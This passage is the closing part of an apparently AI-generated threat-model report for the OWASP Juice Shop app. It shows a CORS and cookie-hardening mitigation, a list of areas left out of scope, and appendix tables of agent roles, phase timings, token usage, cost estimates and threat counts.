1. Replace `cors()` with origin-restricted `cors({ origin: ['https://juice-sh.op'] })`
2. Replace hardcoded cookie parser secret `kekse` with `process.env.COOKIE_SECRET`
3. Add `SameSite=Strict` to session cookies

**Verification:** Send a cross-origin preflight request from an unlisted origin; confirm 403 response in CORS preflight.  
**Reference:** [CWE-346](https://cwe.mitre.org/data/definitions/346.html)

---

## 10. Out of Scope

The following areas were not analyzed in this assessment:

- **CTF challenge mechanics and intentional vulnerability triggers** (`challengeUtils.solveIf`) — these are deliberate by design and do not represent unintentional security defects
- **Third-party dependencies not directly invoked in security-critical paths** — the SCA scan was not run (`WITH_SCA=false`); dependency vulnerabilities may exist beyond what is reported
- **OAuth2 / Google Login flow** — only the client-side OAuth client ID is configured; the server-side OAuth callback was not evaluated
- **Web3 / NFT minting features** (`contractExploitListener`, `walletNFTVerify`) — these interfaces were not analyzed
- **CI/CD pipeline and GitHub Actions** — no workflow files were analyzed for supply chain risks
- **Monitoring infrastructure** — Prometheus scrape configuration and alerting rules were not reviewed
- **Cryptographic primitive selection beyond password hashing** — the premium content encryption key scheme was not fully analyzed

---

## Appendix: Run Statistics

### Run Metadata

| Field | Value |
|-------|-------|
| Generated | 2026-04-14T21:08:00Z |
| Invocation | `/create-threat-model --assessment-depth thorough --full --verbose` |
| Assessment Mode | Full (resumed — Phase 11 finalization) |
| Plugin Version | appsec-plugin 0.9.0-beta (analysis v1) |
| Assessment Depth | thorough (components: 8, STRIDE turns: 20/28/35) |
| Repository | `/home/mrohr/juice-shop` |
| Baseline SHA | n/a (first full run) |
| Current SHA | `cb6fb8a83458fe3c63dd03c80f46ceda0438dc1f` |

### Agents & Models

| Agent | Model | Role | Phases |
|-------|-------|------|--------|
| threat-analyst | claude-sonnet-4-6 | Orchestrator — architecture, controls, synthesis, finalization | 1, 3-8, 10-11 |
| recon-scanner | claude-sonnet-4-6 | Tech stack and security pattern reconnaissance | 2 |
| stride-analyzer | claude-sonnet-4-6 | Per-component STRIDE threat analysis | 9 (1 completed file + inline synthesis) |
| qa-reviewer | claude-sonnet-4-6 | Cross-reference validation, link fixes, consistency | Post-assessment |

### Phase Duration Breakdown

| Phase | Description | Agent(s) | Duration |
|-------|-------------|----------|----------|
| Phase 1 | Context Resolution | threat-analyst (claude-sonnet-4-6) [cache hit] | 0m 00s |
| Phase 2 | Reconnaissance | recon-scanner (claude-sonnet-4-6) | 1m 28s |
| Phase 3 | Architecture Modeling | threat-analyst (claude-sonnet-4-6) | n/a (resumed) |
| Phase 4 | Security Use Cases | threat-analyst (claude-sonnet-4-6) | n/a (resumed) |
| Phase 5 | Asset Identification | threat-analyst (claude-sonnet-4-6) | n/a (resumed) |
| Phase 6 | Attack Surface Mapping | threat-analyst (claude-sonnet-4-6) | n/a (resumed) |
| Phase 7 | Trust Boundary Analysis | threat-analyst (claude-sonnet-4-6) | n/a (resumed) |
| Phase 8 | Security Controls Catalog | threat-analyst (claude-sonnet-4-6) | n/a (resumed) |
| Phase 9 | STRIDE Threat Enumeration (1 completed component) | stride-analyzer (claude-sonnet-4-6) | n/a (partial, resumed) |
| Phase 10 | Scan Synthesis | threat-analyst (claude-sonnet-4-6) | n/a (resumed) |
| Phase 11 | Finalization (YAML + MD composition) | threat-analyst (claude-sonnet-4-6) | included in session total |
| **Assessment Total** | | | **11m 00s (estimated)** |
| QA Review | Cross-reference validation, link fixes, consistency checks | qa-reviewer (claude-sonnet-4-6) | included |
| **Grand Total** | | | **~11m 00s** |

> Phases 1–2 ran sequentially (cache hit on Phase 1). Phase 9 was partially completed in the previous session with 1 stride analyzer output file. This session resumed at Phase 11 finalization and synthesized all threat data from the existing `.threats-merged.json` and `threat-model.yaml`.

### Token Consumption

| Category | Tokens |
|----------|--------|
| Input | 16 |
| Output | 4,648 |
| Cache Write | 97,432 |
| Cache Read | 190,006 |
| **Total** | **292,102** |

> Host-session tokens only. Sub-agent tokens (e.g., stride-analyzer) are executed within the host session and included in these totals.

### Cost Estimate

| Metric | claude-sonnet-4-6 |
|--------|-------------------|
| With prompt caching | ~$0.4921 (estimated) |
| Without prompt caching | ~$0.93 (estimated) |
| Cache savings | 47.2% |

> Billing: subscription (estimated). Costs are shown for reference.

<details><summary>API pricing reference (per 1M tokens)</summary>

| Model | Input | Output | Cache Write | Cache Read |
|-------|-------|--------|-------------|------------|
| claude-sonnet-4-6 | $3.00 | $15.00 | $3.75 | $0.30 |
| claude-opus-4-6 | $15.00 | $75.00 | $18.75 | $1.50 |
| claude-haiku-4-5 | $0.80 | $4.00 | $1.00 | $0.08 |

</details>

### Coverage Summary

| Metric | Count |
|--------|-------|
| Components analyzed | 5 (auth-service, rest-api, frontend-spa, file-upload, admin-panel) |
| Total threats identified | 30 |
| Critical threats | 5 |
| High threats | 19 |
| Medium threats | 6 |
| Low threats | 0 |
| Mitigations generated | 21 |
| Security controls rated | 16 |
| Attack surface entry points | 10 (8 unauthenticated, 2 authenticated) |
| Trust boundaries mapped | 6 |
| Assets catalogued | 11 |

